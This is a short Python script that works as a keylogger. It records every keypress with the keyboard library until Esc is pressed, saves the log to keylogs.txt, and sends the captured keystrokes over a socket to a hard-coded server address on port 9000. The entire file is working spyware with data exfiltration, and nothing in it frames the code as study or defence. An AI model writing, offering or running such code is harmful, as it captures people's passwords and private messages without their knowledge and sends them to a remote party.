import keyboard
import socket
import sys
import time

def main():
    log = ""
    server_ip = "192.168.122.182"
    port = 9000
    
    while True:
        events = keyboard.read_event()
        if events.name == 'esc':
            break
        elif events.event_type == keyboard.KEY_DOWN:
            log += str(events.name) + " "
            print("Key Pressed: ", events.name)
    
    try:
        with open('keylogs.txt', 'w') as f:
            f.write(log)
        
        print("Sending data to server...")
        
        # Create a socket object
        s = socket.socket()
        
        # Connect to the server
        s.connect((server_ip, port))
        
        # Send the log data
        s.sendall(log.encode())
        
        # Close the connection
        s.close()
        
    except Exception as e:
        print("Error occurred: ", str(e))
        sys.exit()

if __name__ == "__main__":
    main()